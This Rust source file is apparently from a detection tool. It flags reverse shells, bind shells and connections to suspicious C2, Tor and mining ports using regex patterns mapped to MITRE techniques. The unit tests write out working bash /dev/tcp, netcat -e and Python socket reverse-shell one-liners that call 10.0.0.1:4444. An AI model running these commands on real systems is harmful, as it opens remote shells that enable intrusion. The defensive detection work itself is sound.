//! Command and Control detection (T1059.004, T1571, T1090.003)
//!
//! Detects:
//! - Reverse shells (bash, nc, python, perl, etc.)
//! - Bind shells
//! - Suspicious outbound connections (ports, Tor, mining)

use super::{Confidence, DetectionRule, MitreMapping, Severity};
use regex::Regex;
use std::net::IpAddr;

lazy_static::lazy_static! {
    /// Reverse shell command patterns (matched against lowercased cmdline).
    static ref REVERSE_SHELL_PATTERNS: Vec<(Regex, &'static str, Severity)> = vec![
        // Bash reverse shells
        (
            Regex::new(r"bash\s+-i\s+>&?\s*/dev/tcp/").unwrap(),
            "Bash /dev/tcp reverse shell",
            Severity::Critical
        ),
        (
            Regex::new(r#"bash\s+-c\s+['"].*>/dev/tcp/"#).unwrap(),
            "Bash -c reverse shell",
            Severity::Critical
        ),
        (
            Regex::new(r"/dev/tcp/\d{1,3}(?:\.\d{1,3}){3}/\d+").unwrap(),
            "Bash /dev/tcp connection",
            Severity::Critical
        ),
        (
            Regex::new(r"/dev/udp/\d{1,3}(?:\.\d{1,3}){3}/\d+").unwrap(),
            "Bash /dev/udp connection",
            Severity::High
        ),

        // Netcat reverse shells
        (
            Regex::new(r"\bnc\b\s+(-e|-c)\s+(/bin/)?(ba)?sh\b").unwrap(),
            "Netcat -e shell",
            Severity::Critical
        ),
        (
            Regex::new(r"\bnc\b\s+.*\d{1,3}(?:\.\d{1,3}){3}\s+\d+.*\s+-e\b").unwrap(),
            "Netcat reverse connect with -e",
            Severity::Critical
        ),
        (
            Regex::new(r"\bncat\b\s+.*--sh-exec\b").unwrap(),
            "Ncat --sh-exec shell",
            Severity::Critical
        ),
        (
            Regex::new(r"mkfifo\s+/tmp/[a-z0-9]+.*\bnc\b\s+").unwrap(),
            "Named pipe netcat reverse shell",
            Severity::Critical
        ),

        // Python reverse shells
        (
            Regex::new(r"python\d*.*socket.*connect.*subprocess").unwrap(),
            "Python socket reverse shell",
            Severity::Critical
        ),
        (
            Regex::new(r"python\d*.*pty\.spawn").unwrap(),
            "Python PTY spawn shell",
            Severity::High
        ),
        (
            Regex::new(r#"python\d*.*-c\s+['"]import\s+socket"#).unwrap(),
            "Python one-liner socket",
            Severity::Critical
        ),

        // Perl reverse shells
        (
            Regex::new(r"perl.*socket.*connect.*exec").unwrap(),
            "Perl socket reverse shell",
            Severity::Critical
        ),
        (
            Regex::new(r#"perl\s+-e\s+['"].*socket.*sock_stream"#).unwrap(),
            "Perl one-liner reverse shell",
            Severity::Critical
        ),

        // PHP reverse shells
        (
            Regex::new(r"php.*fsockopen.*exec").unwrap(),
            "PHP fsockopen reverse shell",
            Severity::Critical
        ),
        (
            Regex::new(r#"php.*-r\s+['"].*shell_exec"#).unwrap(),
            "PHP shell_exec",
            Severity::High
        ),

        // Ruby reverse shells
        (
            Regex::new(r"ruby.*tcpsocket.*exec").unwrap(),
            "Ruby TCPSocket reverse shell",
            Severity::Critical
        ),

        // Socat
        (
            Regex::new(r"socat\s+.*exec.*tcp").unwrap(),
            "Socat reverse shell",
            Severity::Critical
        ),
        (
            Regex::new(r"socat\s+tcp.*exec:").unwrap(),
            "Socat TCP exec",
            Severity::Critical
        ),

        // OpenSSL reverse shell
        (
            Regex::new(r"openssl\s+s_client.*-connect.*\|.*\bsh\b").unwrap(),
            "OpenSSL encrypted reverse shell",
            Severity::Critical
        ),

        // Telnet reverse shell
        (
            Regex::new(r"telnet\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d+.*\|.*\bsh\b").unwrap(),
            "Telnet piped reverse shell",
            Severity::Critical
        ),

        // awk reverse shell
        (
            Regex::new(r#"awk.*"/inet/tcp/.*getline"#).unwrap(),
            "AWK reverse shell",
            Severity::High
        ),
    ];

    /// Suspicious C2 ports.
    static ref SUSPICIOUS_PORTS: Vec<u16> = vec![
        4444,   // Metasploit default
        5555,   // Common backdoor
        6666,   // IRC/backdoors
        1337,   // leet
        31337,  // Back Orifice/leet
        12345,  // NetBus
        8080,   // Alternative HTTP (often C2)
        9001,   // Common C2/Tor relays
        9090,   // Common C2
        3333,   // Stratum mining
        14433,  // Stratum mining SSL
    ];
}

/// Detect reverse shell in command line.
pub fn detect_reverse_shell_cmdline(cmdline: &str) -> Option<ReverseShellAlert> {
    let cmdline_lower = cmdline.to_lowercase();

    for (pattern, description, severity) in REVERSE_SHELL_PATTERNS.iter() {
        if pattern.is_match(&cmdline_lower) {
            return Some(ReverseShellAlert {
                cmdline: cmdline.to_string(),
                pattern_matched: description.to_string(),
                severity: *severity,
                rule: DetectionRule {
                    id: "C2-001".to_string(),
                    name: "Reverse Shell Detected".to_string(),
                    description: format!("{}: {}", description, cmdline),
                    severity: *severity,
                    confidence: Confidence::High,
                    mitre: MitreMapping::new("T1059.004"),
                    false_positive_notes: vec![
                        "Legitimate penetration testing".to_string(),
                        "Security training exercises".to_string(),
                    ],
                    references: vec!["https://attack.mitre.org/techniques/T1059/004/".to_string()],
                },
            });
        }
    }

    None
}

/// Detect suspicious network connections.
pub fn detect_suspicious_connection(
    pid: u32,
    dst_ip: IpAddr,
    dst_port: u16,
    comm: &str,
) -> Option<C2Alert> {
    if SUSPICIOUS_PORTS.contains(&dst_port) {
        let legitimate_on_port: Vec<(&str, u16)> = vec![("prometheus", 9090), ("grafana", 3333)];
        if legitimate_on_port
            .iter()
            .any(|(name, port)| comm.to_lowercase().contains(name) && dst_port == *port)
        {
            return None;
        }

        return Some(C2Alert {
            pid,
            comm: comm.to_string(),
            dst_ip,
            dst_port,
            alert_type: C2AlertType::SuspiciousPort,
            rule: DetectionRule {
                id: "C2-010".to_string(),
                name: "Connection to Suspicious Port".to_string(),
                description: format!(
                    "Process {} ({}) connecting to {}:{}",
                    comm, pid, dst_ip, dst_port
                ),
                severity: Severity::High,
                confidence: Confidence::Medium,
                mitre: MitreMapping::new("T1571"),
                false_positive_notes: vec![
                    "Legitimate services may use these ports".to_string(),
                    "Development/testing environments".to_string(),
                ],
                references: vec!["https://attack.mitre.org/techniques/T1571/".to_string()],
            },
        });
    }

    // Tor ports.
    let tor_ports = [9050, 9051, 9150];
    if tor_ports.contains(&dst_port) {
        return Some(C2Alert {
            pid,
            comm: comm.to_string(),
            dst_ip,
            dst_port,
            alert_type: C2AlertType::TorConnection,
            rule: DetectionRule {
                id: "C2-011".to_string(),
                name: "Tor Network Connection".to_string(),
                description: format!(
                    "Process {} ({}) connecting to Tor port {}",
                    comm, pid, dst_port
                ),
                severity: Severity::Medium,
                confidence: Confidence::High,
                mitre: MitreMapping::new("T1090.003"),
                false_positive_notes: vec![
                    "Tor browser is legitimate".to_string(),
                    "Privacy-focused applications".to_string(),
                ],
                references: vec![],
            },
        });
    }

    // Stratum mining protocol ports.
    let stratum_ports = [3333, 14433, 14444, 45700];
    if stratum_ports.contains(&dst_port) {
        return Some(C2Alert {
            pid,
            comm: comm.to_string(),
            dst_ip,
            dst_port,
            alert_type: C2AlertType::CryptoMining,
            rule: DetectionRule {
                id: "C2-020".to_string(),
                name: "Cryptocurrency Mining Connection".to_string(),
                description: format!(
                    "Process {} ({}) connecting to stratum port {}",
                    comm, pid, dst_port
                ),
                severity: Severity::High,
                confidence: Confidence::High,
                mitre: MitreMapping::new("T1496"),
                false_positive_notes: vec!["Legitimate mining operations".to_string()],
                references: vec![],
            },
        });
    }

    None
}

/// Detect bind shell.
pub fn detect_bind_shell(pid: u32, port: u16, comm: &str) -> Option<ReverseShellAlert> {
    let shells = ["sh", "bash", "dash", "ash", "zsh", "fish", "csh", "tcsh"];

    if shells.iter().any(|s| comm.ends_with(s)) && port > 0 {
        return Some(ReverseShellAlert {
            cmdline: format!("{}:{}", comm, port),
            pattern_matched: "Shell listening on port".to_string(),
            severity: Severity::Critical,
            rule: DetectionRule {
                id: "C2-030".to_string(),
                name: "Bind Shell Detected".to_string(),
                description: format!(
                    "Shell process {} (PID {}) listening on port {}",
                    comm, pid, port
                ),
                severity: Severity::Critical,
                confidence: Confidence::Critical,
                mitre: MitreMapping::new("T1059.004"),
                false_positive_notes: vec![],
                references: vec![],
            },
        });
    }

    None
}

#[derive(Debug, Clone)]
pub struct ReverseShellAlert {
    pub cmdline: String,
    pub pattern_matched: String,
    pub severity: Severity,
    pub rule: DetectionRule,
}

#[derive(Debug, Clone)]
pub struct C2Alert {
    pub pid: u32,
    pub comm: String,
    pub dst_ip: IpAddr,
    pub dst_port: u16,
    pub alert_type: C2AlertType,
    pub rule: DetectionRule,
}

#[derive(Debug, Clone)]
pub enum C2AlertType {
    SuspiciousPort,
    TorConnection,
    CryptoMining,
    Beaconing,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bash_reverse_shell() {
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let result = detect_reverse_shell_cmdline(cmd);
        assert!(result.is_some());
        assert_eq!(result.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_nc_reverse_shell() {
        let cmd = "nc -e /bin/sh 10.0.0.1 4444";
        let result = detect_reverse_shell_cmdline(cmd);
        assert!(result.is_some());
    }

    #[test]
    fn test_python_reverse_shell() {
        let cmd = "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));subprocess.call([\"/bin/sh\",\"-i\"])'";
        let result = detect_reverse_shell_cmdline(cmd);
        assert!(result.is_some());
    }

    #[test]
    fn test_legitimate_command() {
        let cmd = "cargo build --release";
        let result = detect_reverse_shell_cmdline(cmd);
        assert!(result.is_none());
    }

    #[test]
    fn test_suspicious_port() {
        let result =
            detect_suspicious_connection(1234, "10.0.0.1".parse().unwrap(), 4444, "suspicious");
        assert!(result.is_some());
    }
}
